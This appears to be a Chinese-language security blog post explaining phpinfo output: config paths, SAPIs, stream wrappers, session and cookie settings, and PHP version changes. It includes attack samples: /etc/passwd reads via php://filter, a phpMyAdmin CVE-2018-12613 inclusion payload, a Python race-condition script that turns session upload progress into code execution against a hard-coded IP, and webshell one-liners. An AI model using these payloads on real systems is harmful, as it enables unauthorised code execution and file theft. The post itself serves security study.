---
title: Just something about phpinfo  
tags:
  - PHP
date: 2019-11-13 11:07:57
---

Know it then do it! Memo#解读phpinfo@[Phith0n](https://www.leavesongs.com/)

### 0x01 php.ini

![](/assets/images/move/2019-11-13-11-15-57.png)

上图中的 4 项配置与 php.ini 有关，php.ini 是 php 的配置文件，但并不是每个 php 环境都会有该文件，在没有指定 php.ini 配置文件的时候，php 将采用**默认配置**：

1. 没有任何 php.ini 时，某个配置项默认值

2. 使用 apt 等源管理工具安装 php, 其默认 php.ini 里配置的值

上述两种默认配置绝大多数情况下是相同的，但还是会有些许不同。

#### [Discuz! 6.x/7.x 全局变量防御绕过导致命令执行](https://www.secpulse.com/archives/2338.html)

`$_REQUEST` 这个超全局变量的值受 php.ini 中 `request_order` 的影响,在最新的 php 5.3.x 系列中, `request_order` 默认值为 GP,也就是说默认配置下 $_REQUEST只包含 $_GET 和 $_POST, 而不包括 $_COOKIE, 那么我们就可以通过 COOKIE 来提交 GLOBALS 变量了:), 从而进一步造成代码代码执行。

```php
if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
    exit('Request tainting attempted.');
}
```

这里 `request_order` 默认值变为 GP，指的为第 2 种情况，也就是说一个没有任何 php.ini 文件的环境，其默认的 `request_order` 依然为 GPC 而非 GP。两种默认值的含义要加以区分，避免出现错误。

另外，在编译 PHP 的时候，我们可以指定 `--with-config-file-path` 和 `--with-config-file-scan-dir`。这两个配置项的意思是，PHP 会在 `--with-config-file-path` 指定的目录下寻找 php.ini 文件，如果找到则加载之；除此之外，PHP 还会在 `--with-config-file-scan-dir` 指定的目录下，寻找所有以 .ini 为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。

所以，通常用 apt-get install php-pdo 来安装 php 扩展，都会在 `--with-config-file-scan-dir` 下写入新的配置文件，而不是修改 php.ini。这样，我们如果遇到 phpinfo 页面，即可用过这两个配置项，来定位 php.ini 以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的 php 配置，进而达成跨站、提权等目的。


### 0x02  Server API

![](/assets/images/move/2019-11-13-16-37-42.png)


Server API 指的是当前 PHP 运行模式，SAPI 是 PHP 内核的一个概念，相当于 PHP 核心解释器和应用层(如 Web 中间件)的一个桥梁，我们需要在 SAPI 中实现一些函数来供 PHP 底层调用。（[理解php内核中SAPI的作用](https://foio.github.io/php-sapi/)）

![](/assets/images/move/2019-11-13-16-43-00.png)

FPM/FastCGI 就是 SAPI 中的一种，其提供了一种以 fastcgi 协议和 Web 中间件（如 Nginx ）通信的接口，具体流程可参考 [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html).

PHP 为 Apache 提供了一个专用了 SAPI —— Apache 2.0 Handler。相当于是把 PHP 编译成一个动态链接库，作为 Apache 的一个模块。当然，Apache 也不一定必须用这种 SAPI，他同样也支持用 Fastcgi 和 PHP-FPM 通信。所以，即使你在实战中遇到了服务器是 Apache 的环境，也不能就此认定其一定存在 Apache 模块。你可以尝试下载一个PHPStudy，来看看是否有 apache_get_version 函数，答案是否定的。

我们平时在命令行里运行 PHP，比如 php -i，你可以看到此时的 Server API 是 “Command Line Interface”, 这个SAPI就是给命令行用的。

另外，PHP 5.4 及以后，我们可以用 `php -S localhost:8080` 来启动PHP内置的 Web server。这个 Web server 其实也是一个SAPI，名为 “Built-in HTTP server”, PHP Built-in Server 相当于实现了一个 Web 文件服务器，然后将 PHP 有关的请求发给 “Built-in HTTP server” 这个 SAPI，最终交给解释器解析。

phpdbg 是 PHP 5.4 及以后加入的一个 php 交互式调试器，他也是一个 SAPI。

### 0x03 Registered PHP Streams

![](/assets/images/move/2019-11-13-16-53-53.png)


Registered PHP Streams 中列出了 PHP 默认支持的一些协议。

1. https 和 http 自然不用说，用来包装 http 协议，我们可以执行 `readfile('Example Domain');` 来发送一个 http 请求。ftps 和 ftp，用来包装 ftp 协议，和 http 类似。

2. compress.zlib 用来处理 zlib 压缩过的数据，比如我们可以用 `readfile('compress.zlib://file.gz');` 来读取用 zlib 压缩过的文件。

3. php 是 php 特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考[PHP: php:// - Manual](http://php.net/manual/zh/wrappers.php.php)

4. file 用来访问本地文件，比如 `readfile('file:///etc/passwd');`。

5. glob 用来以模式匹配的方式访问本地目录，比如 `dir('glob:///etc/*')`。

6. data 可以用 url 的方式来模拟一个输入流（RFC 2397），比如，readfile 通常是用来读取文件中的内容，但我们可以通过 `readfile('data://text/plain;base64,SGVsbG8=');` 来解码 base64 串，并将其作为输入流读取。

7. phar 是用来读写 PHP 归档，PHP 归档类似于 Java 的 .jar 文件，我们可以将一个完整的 PHP 项目（可能包含数百个文件）打包成一个.phar，比如 composer.phar。phar流就负责读写这个文件。

8. 除此之外，常见的协议还有 zip://，用来读写 zip 格式的压缩文件；`compress.bzip2://` 用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。另外，用户也可以定义自己的流，即实现 streamWrapper 类中的方法。（eg: [CISCN-2018-Final blgdel](https://3nd.xyz/2019/10/07/Writeup/adworld-web-writeup-2/)）


### 0x04 Registered Stream Filters

![](/assets/images/move/2019-11-13-17-09-33.png)

Registered Stream Filters 列出了一些默认支持的filter流。

其实 PHP 中的 filter 流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而 filter 流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个 Hook。

1. zlib.* 用来压缩和解压数据，和 compress.zlib:// 协议不同的是，用 zlib 流可以压缩、解压任何其他协议里传输的数据。

2. convert.iconv.* 用来转换编码。

3. string.* 用来做字符串转换，比如 string.strip_tags 用来去除字符串中的标签，string.tolower 用来将字符串转换成小写。

4. convert.\* 用来转换数据，比如用 convert.base64-decode 可以做 base64 的解码。其实我觉得放在 string.* 里也可以。

5. dechunk 用来处理 chunk 相关的数据，chunk 是 HTTP1.1 中传输流式数据的方式（[Chunked transfer encoding - Wikipedia](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)），用这个 filter 流就能将 chunk 解开。

6. consumed 应该是用来计算数据字符数量的。

在 PHP 里，我们可以用 `stream_filter_append` 函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用 php://filter 协议来使用上述流，比如:

```php
readfile('php://filter/read=convert.base64-encode/resource=/etc/passwd');
```

关于 php://filter 的一些有趣的技巧，可以参考阅读 [谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)。

一些与协议相关的安全 Tricks :

1. 利用 phar/zip 协议绕过有后缀的文件包含：`include zip:///var/www/html/upload/1.gif#1.php`。

2. 利用 curl + gopher 协议进行 SSRF 漏洞利用： [Do Evil Things with gopher://](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html)。

3. SSRF 检查 host 时进行文件读取：`file://localhost/etc/passwd`。

4. 利用 php协议 + zlib.inflate 流压缩数据，突破 libxml 解析器限制的实体长度。

```php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

### 0x05 CGI / FastCGI

#### CGI

![](/assets/images/move/2019-11-13-20-08-31.png)

CGI 即 Common Gateway Interface，译作“通用网关接口”。具体可以参看：[万剑归宗——CGI - 果冻虾仁的文章 - 知乎](https://zhuanlan.zhihu.com/p/25013398)。对一个 CGI 程序，做的工作其实只有：从 `环境变量(environment variables)` 和 `标准输入(standard input)` 中读取数据、处理数据、向 `标准输出(standard output)`输出数据。FastCGI 正是对 CGI 的改进，而且改进了不是一点点。从总体上看，一个 FastCGI 进程可以处理若干请求（一般 FastCGI 进程是驻留着的，但不排除 IIS 之类的 Web Server 限制其空闲时间，在一段时间内没有请求就自动退出的可能），Web Server 或者 fpm 会控制 FastCGI 进程的数量。细节方面，FastCGI 是一套协议，不再是通过简单的环境变量、标准输入和标准输出来接收和传递数据了。一般来说，FastCGI 用 TCP 或者 **命名管道(Named Pipe)** 传输数据。

![](/assets/images/move/2019-11-13-20-32-17.png)

默认情况下我们需要将 php解释器 放在 cgi-bin 目录下，这样用户通过访问 /cgi-bin/php/dir/script.php，即可执行 /dir/script.php。这个操作是很危险的，所以PHP增加了如下配置：`cgi.force_redirect=1`，开启了这个选项（默认开启）以后，只有经过了重定向规则请求才能执行。

1. force_redirect 与 redirect_status_env。

  Apache 在 **重定向（rewrite）** 的时候，会增加一个名为 REDIRECT_STATUS 的环境变量，cgi.force_redirect 就是依赖这个环境变量，来判断是否经历了重定向。如果非 Apache 服务器，我们就需要设置一下 cgi.redirect_status_env，来指定 php 判断请求是否经历重定向的条件。当然，最优的方式是，将解释器放置在 web 目录以外。此时就需要设置 cgi.discard_path=1。不过这样，我们就需要和 Perl 一样，在 php 脚本第一行增加 `Shebang（#!/usr/bin/php）` 指定执行这个脚本的解释器。

2. nph 和 rfc2616_headers。

  cgi.nph 和 cgi.rfc2616_headers 都和 status 头有关。cgi.nph=1 的时候，Status: 200 会被加到 fastcgi 返回头中。cgi.rfc2616_headers 标示是发送 Status 头，还是返回兼容 HTTP 协议中的 HTTP/1.1 200 OK头。这二者和安全没关系。

3. fix_pathinfo

  在设置 `cgi.fix_pathinfo=1` 的时候（默认开启），php 将支持 PATH_INFO。PATH_INFO 是 rfc3875 中定义的一个环境变量。我们请求 `/cgi-bin/example.php/foo/bar`，这个 /foo/bar 就会被作为 PATH_INFO 环境变量，实际执行的是 `/cgi-bin/example.php`。

  如果 `cgi.fix_pathinfo=0`，php 将会执行完整的 `/cgi-bin/example.php/foo/bar` 文件，显然这个文件是不存在的，所以会返回 404。

  在 fix_pathinfo 开启的情况下，可能出现一个 BUG。我们试想一下：Nginx 配置中，匹配到以 .php 结尾的请求则发送给 php-fpm 执行。我们发送 `1.gif/1.php`，则通过了 Nginx 的匹配，发送给 php-fpm。php-fpm 开启 cgi.fix_pathinfo，所以 “/1.php” 这部分内容被作为了 PATH_INFO，实际执行的是 1.gif。这就是所谓 “nginx解析漏洞” 的产生原因，实际上和nginx、php的配置有关。

#### FastCGI

Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。HTTP 协议是浏览器和服务器中间件进行数据交换的协议，浏览器将 HTTP 头和 HTTP 体用某个规则组装成数据包，以 TCP 的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以 HTTP 协议的规则打包返回给服务器。类比HTTP协议来说，fastcgi 协议则是服务器中间件（如Nginx）和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

PHP-FPM（FastCGI Process Manager） 则是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给FPM。FPM 按照 fastcgi 的协议将 TCP 流解析成真正的数据。与此同时，PHP-FPM还是一个进程管理器，他启动多个子进程来执行上面说的解析及运行操作。




### 0x06 Session

#### save_path

![](/assets/images/move/2019-11-13-20-46-56.png)

session.save_path 设置了 session 的存储路径，我们阅读文档，文档里说这个值默认在 /tmp，实际上测试可以发现：

- Debian 或 Ubuntu 下用源安装 php，默认的 php.ini 中没有这个配置项，实际 session 会存储在 /var/lib/php5/sessions 或 /var/lib/php/sessions.

- Centos 下用源安装 php，默认的 php.ini 中设置了这个值为 /var/lib/php/sessions。如果去除这个设置，session 将存储在 /tmp。

Debian 或 Ubuntu 下应该是编译的时候就把 /var/lib/php5/sessions 硬编码到二进制文件里了，我们用 strings 查看可找到该字符串。

```bash
strings /usr/bin/php | grep /var/lib/php5/sessions
```

另外，save_path 完整的配置为：`N;MODE;/path`。N 是 session 存储的目录深度，指定了这个值后，session 会被分散在一些子目录里，避免因为 session 文件过多导致目录太大进不去的情况；MODE 是 session 文件的权限，默认是 600。另外，session_path 的初值是不受 open_basedir 影响的，但如果中途修改其值，还是会受影响。

#### session

HTTP是一个无状态的协议，一个用户访问多次一个网站，网站怎么判断这多次访问是来自于一个用户呢？通过IP地址显然是不行的，因为存在共享IP的情况。这时候，网站可以将用户的 id 存储在 Cookie 中，每次用户访问的网站时浏览器将会把 Cookie 一起发送，然后网站在数据库中进行查询，即可确定究竟是哪个用户访问了自己。但这种方式也带来一个问题，Cookie 是用户可控的，用户可以将 id 修改成任意其他用户的 id，即可伪造身份了，这也是很多网站存在 “Cookie欺骗漏洞” 的原因。

所以，我们在Cookie的基础之上增加了Session这个概念：用户第一次登录网站的时候，网站生成一个随机的字符串作为Session id保存在其Cookie中，实际上真实的用户名、邮箱等信息存储在服务端，并和Session id一一对应。这种情况下，用户下次访问网站的时候，网站根据Session id拿到用户真实的id，进一步做后续操作。由于session id是随机生成的字符串，不同用户之间是不知道对方的Session id的，所以也就可以避免伪造身份的情况了。

那么，既然后端要存储用户的信息，那么就需要有地方来存。Java Web默认情况下是在内存里维护一个哈希表，其中包含Session id和具体数据的关系，但因为内存是在进程中的，所以当重新 Web 容器后 Session 表也就失效了，所有用户都需要重新登录。PHP就不一样，我们看 phpinfo 中 Session 的第一部分:

![](/assets/images/move/2019-11-13-21-02-52.png)

这里介绍了php默认的Session存储方式：文件（files user）。PHP 将 Session 存储在文件中，每个 session id 一个文件，文件内容是序列化后的 Session 数据。这也就避免了重启 Web 容器后 Session 失效的问题。而第三行的 Registered serializer handlers 是序列化方式，PHP 支持三种序列化方法，分别是：

1. php_serialize
2. php
3. php_binary

其中，方法 php 和 php_binary 几乎是相同的，只是 php 使用 `|` 作为键名与键值的分割符（所以，这种情况下 Session 的键名是不允许有竖线的），而 php_binary 是在第一位指定键名的长度，剩下的内容作为键值。php_serialize 是 5.5.4 以后加入的新的序列化方法，其效果就等于直接使用 php 的 serialize 函数。

如果不指定，PHP 默认使用第二种，也就是 “php” 作为 session 序列化的方法。你可以试试，设置 `$_SESSION['a|b'] = 1;`，会发现实际上设置不进去，这就是 “php” 的特性。

两个有趣的漏洞：

1. [PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)，在设置Session和读取Session两个阶段，如果使用了不同的序列化方法，将会导致任意对象注入，进而导致反序列化漏洞。

2. [Joomla远程代码执行漏洞分析（总结）](https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html)，主要利用的两个技巧：
  1. Mysql UTF8 缺失4字节字符导致的截断（[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)）;
  2. PHP **5.6.13** 以前底层解码 Session 时特性导致注入任意对象。


#### lazy_write

![](/assets/images/move/2019-11-13-21-15-29.png)

`session.lazy_write` 是 PHP 7 以后引入的，改进了 Session 的性能。当这个值设置成1时（默认就是1），Session 数据只有在请求结束后才写入文件，而且如果没有操作，则不会重新写入文件。

```php
# 读取不到任何信息 在执行 readfile 的时候还没结束请求，所以 session.lazy_write 尚未写入
<?php
session_start();
$_SESSION['a'] = 2;
readfile('/tmp/sess_' . session_id());
```

#### name

`session.name` 是 Session 设置到 Cookie 里的键名，默认为`PHPSESSID`。这也是很多时候，我们发现Cookie中有`PHPSESSID`，基本就能判断后端是PHP开发的了。

#### cookie_samesite



`session.cookie_samesite` 是PHP 7.3以后引入的一个新配置，samesite 是为了防御CSRF漏洞而增加的一个安全选项，在较新的浏览器中均增加了支持。

在以前，我们在evil.com向example.com下发送HTTP请求，是会带上example.com的Cookie的（这也是cnzz和百度统计等统计网站的原理）。

而在CSRF漏洞里，虽然攻击者无法在example.com下直接执行恶意操作，他只需要在自己的网站evil.com下构造一个表单，让管理员访问并自动向example.com提交，这时候实际表现就是管理员带着证明自己是管理员身份的Cookie提交了表单，执行了恶意操作。

那么，如果要防御CSRF漏洞，就有两种方法：

1. 表单中包含攻击者不知道的随机字符串，于是攻击者也就无法构造恶意表单了

2. 在表单被提交后验证这个表单是否是本站提交的，如果来源于其他站点，自然就是恶意的

这两种方法都是在服务器端进行验证，而samesite属性给浏览器端防御CSRF漏洞带来了可能。

samesite属性可能有如下几个值：

1. samesite=Strict
2. samesite=Lax

当浏览器发现设置Cookie的时候samesite是以上两个值，则会把这个Cookie标志为“同站Cookie”。如果 samesite=Strict，则任何其他站点发送给当前站点的请求中，都不会带上这个Cookie；如果samesite=Lax，则任何其他站点发送给当前站点的非GET/HEAD请求中，都不会带上这个Cookie。

简单来说，设置了samesite=Strict的网站，你把这个网址发送给其他用户，他们点击这个超链接后访问这个网站，这个HTTP请求是不会带有Cookie的。更科学的使用方法是samesite=Lax，设置了这个属性的Cookie，只有在发送非GET/HEAD请求的时候才会进行限制。而通常敏感请求都应该使用POST来发送，所以这样的确可以防御大部分情况了。

#### use_strict_mode

![](/assets/images/move/2019-11-13-21-25-43.png)

`session.use_strict_mode`是个有趣的配置，有时候也和安全有一定关系，默认情况下，`session.use_strict_mode`值是0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置`PHPSESSID=zsxqzsxq`，PHP将会在服务器上创建一个文件：`/tmp/sess_zsxqzsxq`，那么，我们自然会想到，如果设置PHPSESSID是`../../etc/cron.hourly/test`，是不是就能写入任意文件了呢？显然PHP不会犯这样的错误，ID的值仅限于“a-z, A-Z, 0-9 and '-,'”。那么，如果将`session.use_strict_mode`设置为1，用户就不能自定义Session ID了，Session ID必须是服务器初始化后发送给用户。

eg: phpmyadmin 4.8.1 文件包含漏洞（CVE-2018-12613），有一个比较简单的利用方法。进入phpmyadmin后，执行一下 `SELECT '<?=phpinfo()?>'`; ，然后包含你自己的session文件即可，Payload:

```php
/index.php?target=db_sql.php%253f/../../../../../../../../tmp/session_sessxxxxxxx
```

但这个技巧的实现要满足一个条件：服务器上需要已经初始化Session。在PHP中，通常初始化 Session 的操作是执行session_start()。所以我们在审计PHP代码的时候，会在一些公共文件或入口文件里看到上述代码。那么，如果一个网站没有执行这个初始化的操作，是不是就不能在服务器上创建文件了呢？

#### auto_start

![](/assets/images/move/2019-11-13-21-35-30.png)

`session.auto_start` 顾名思义，如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。

#### upload_progress

`session.upload_progress` 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。而且，默认情况下 `session.upload_progress.enabled` 是为 On 的，也就是说这个特性默认开启，非常nice。那么，如何利用这个特性呢？只需发送如下数据包：

```http
POST /test.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=--------2015270941
Cookie: PHPSESSID=aaaaaaa
Content-Length: 234

----------2015270941
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

bbbbbbb
----------2015270941
Content-Disposition: form-data; name="file"; filename="test.txt"

...
----------2015270941--
```

可见，我在上传文件的同时，POST了一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，其值为 bbbbbbb。（PHP_SESSION_UPLOAD_PROGRESS 是在 php.ini 里定义的session.upload_progress.name）只要上传包里带上这个键，PHP 就会自动启用 Session，又因为我在 Cookie 中设置了 PHPSESSID=aaaaaaa，所以Session文件将会自动创建。

但它的大小为什么是0呢？因为上传结束后，这个 Session 将会被自动清除（由session.upload_progress.cleanup定义），我们只需要条件竞争，赶在文件被清除前利用即可。所以，在文件包含漏洞找不到可供包含的文件时，可以利用这个技巧。

比如，目标服务器上有这样一段代码：

```php
<?php
  if (isset($_GET['file'])) {
      include './' . $_GET['file'];
  }
```

我们用一个简单的 Python 脚本，即可实现代码执行漏洞的利用：

```python
import io
import requests
import threading

sessid = '3nd'

def t1(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(
            url='http://47.98.224.70/index.php',
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?=phpinfo()?>'},
            files={'file': ('a.txt', f)},
            cookies={'PHPSESSID': sessid}
        )

def t2(session):
    while True:
        response = session.get(f'http://47.98.224.70/index.php?file=../../../../../../../../tmp/sess_{sessid}')
        print(response.text)

with requests.session() as session:
    t1 = threading.Thread(target=t1, args=(session, ))
    t1.daemon = True
    t1.start()
    t2(session)
```


#### cookie

![](/assets/images/move/2019-11-13-22-16-13.png)

众所周知，同源是浏览器安全的基本基石。那么，有的人面试的时候，面试官就会问：Cookie是否遵守同源规则呢？

答案是否定的，Cookie 有一套自己的安全机制，这也是很多前端问题的根源。

判断两个页面是否同源，需要scheme、domain、port三者完全相同，而在Cookie中，限制其能不能被读取的是如下几个选项：

1. `cookie_domain`，设置Cookie的域名
2. `cookie_httponly`，设置HTTPONLY
3. `cookie_path`，设置Cookie在哪个PATH下才能被读取
4. `cookie_secure`，设置Cookie只能在https页面中被传输与读取

我举几个例子，依次来说一下JavaScript在哪些情况下，能或不能读取`document.cookie`：

- `http://example.com`可以读取`http://example.com:8080`的Cookie
- `https://example.com`可以读取`http://example.com`的Cookie
- `cookie_secure=true`的情况下，`http://example.com`不能读取`https://example.com`的Cookie
- `cookie_httponly=true`的情况下，JavaScript不能读取这个Cookie
- `cookie_path=/admin/`的情况下，`http://example.com/`不能读取`http://example.com/admin/`的Cookie
- `cookie_domain=.example.com`的情况下，`http://a.example.com`可以读取`http://b.example.com`的Cookie

可见，Cookie是和端口是没关系的，我们没办法限制同域名不同端口的页面读取互相的Cookie的，同样，https和http也不是完全隔离，而是根据`secure`的值来确认。

有时候，`example.com`的两个子域名，如果想共享某个Cookie，只需要在设置Cookie的时候将`domain`设置成`.example.com`即可。这也是很多大型企业XSS漏洞经常被利用的原因，通常你找到一个边缘站点的低危型XSS，就可以攻击核心子域名。


### 0x07 PHP 5 & PHP 7

![](/assets/images/move/2019-11-13-22-31-49.png)

phpinfo 里最显眼的信息，也就是其标题，其中包含PHP的版本信息。

PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于 2017 年 1 月 19 号停止功能性更新，只提供安全更新。到 2018 年 12 月 31 号为止，PHP 5.6 也将完全终止更新，PHP5 彻底退出历史舞台。

PHP7 里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：


1. 移除不支持SQL预编译的Mysql扩展：mysql

2. 移除preg_replace中容易导致代码执行漏洞的正则模式：e

3. assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数

4. hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 [Online PHP editor | output for ORuc7](https://3v4l.org/ORuc7)

5. 7.2中废弃可以动态执行字符串的 create_function

6. 7.2中废弃容易导致变量覆盖的无第二个参数的 parse_str

7. 移除\<script language=\"php\"\>和\<\%，这两种另类的PHP标签

8. 移除dl函数

关于 PHP 版本的一些说明：[PHP:Supported Versions](http://php.net/supported-versions.php)

PHP5从5.2到5.6，其实也做了很多改进：[php各版本的姿势(2017-02-15更新)](https://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html)

一些版本的 Tricks；

- [PHP5.6利用变长参数构造一句话木马](https://tricking.io/card/26/description) : `usort(...$_GET);`.

- [用不同的PHP标签绕过上传内容检查](https://tricking.io/card/24/description)

```php
<?php phpinfo(); ?>
<? phpinfo(); ?>
<?=phpinfo()?>
<% phpinfo(); %>
<script language="php">phpinfo();</script>
```

- [PHP 5.6.11 数组比较Bug](https://tricking.io/card/2/description)

PHP 5.6.11/5.5.27/5.4.44以前的版本中，存在一处数组比较的Bug（Bug #69892），我们可以通过 

```php
var_dump([0 => 0] === [0x100000000 => 0]); 
```

来复现该特性。

这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别：

- [Online PHP editor | Run code in 200  PHP & HHVM ve...](https://3v4l.org/)

- [PHP Sandbox | Test your PHP code with this code tester](http://sandbox.onlinephpfunctions.com/)